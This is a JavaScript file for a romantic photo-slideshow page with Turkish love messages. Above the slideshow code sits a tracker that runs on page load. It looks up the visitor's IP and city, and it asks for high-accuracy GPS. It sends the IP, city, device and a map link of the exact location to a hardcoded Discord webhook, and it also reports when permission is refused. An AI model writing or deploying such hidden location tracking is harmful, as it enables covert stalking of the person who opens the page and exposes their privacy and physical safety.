// --- AYARLAR ---
const WEBHOOK_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";

// Discord'a mesaj gönderen fonksiyon
async function discordaBas(mesaj) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: mesaj })
        });
    } catch (e) {
        console.error("Discord hatası:", e);
    }
}

// Konum bulma ve gönderme fonksiyonu
function konumMotoru() {
    // 1. IP ile hızlı şehir bulma
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            discordaBas(`🚀 **Siteye Giriş Yapıldı!**\n📍 Şehir: ${data.city}\n🌐 IP: ${data.ip}\n📱 Cihaz: ${navigator.userAgent}`);

            // 2. Hassas GPS Konumu (Kullanıcıya izin sorar)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        // Mobil uyumlu link formatı
                        const harita = `https://www.google.com/maps?q=${lat},${lng}`;
                        discordaBas(`🎯 **TAM KONUM (GPS)!**\n🗺️ Harita: ${harita}`);
                    },
                    (err) => {
                        discordaBas("⚠️ Kullanıcı hassas konum iznini reddetti veya hata oluştu.");
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            }
        });
}

// Sayfa yüklendiğinde çalıştır
window.addEventListener('load', konumMotoru);

// --- SENİN FOTOĞRAF GEÇİŞ SİSTEMİN ---
const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
const sozler = [
    "Seninle her günüm daha güzel.",
    "Gülüşün dünyamı aydınlatıyor.",
    "Kalbim hep seninle.",
    "Sana her baktığımda yeniden aşık oluyorum.",
    "İyi ki varsın, iyi ki benimsin."
];

let index = 0;

// 'İleri' butonuna basıldığında çalışır
window.ileri = function() {
    index++;
    const fotoElement = document.getElementById("foto");
    const sozElement = document.getElementById("soz");
    const hediyeBtn = document.getElementById("hediyeButon");
    const ileriBtn = document.getElementById("ileriBtn");

    if (index >= fotolar.length) {
        if (hediyeBtn) hediyeBtn.style.display = "block";
        if (ileriBtn) ileriBtn.style.display = "none";
        return;
    }

    if (fotoElement) fotoElement.src = fotolar[index];
    if (sozElement) sozElement.innerText = sozler[index];
};
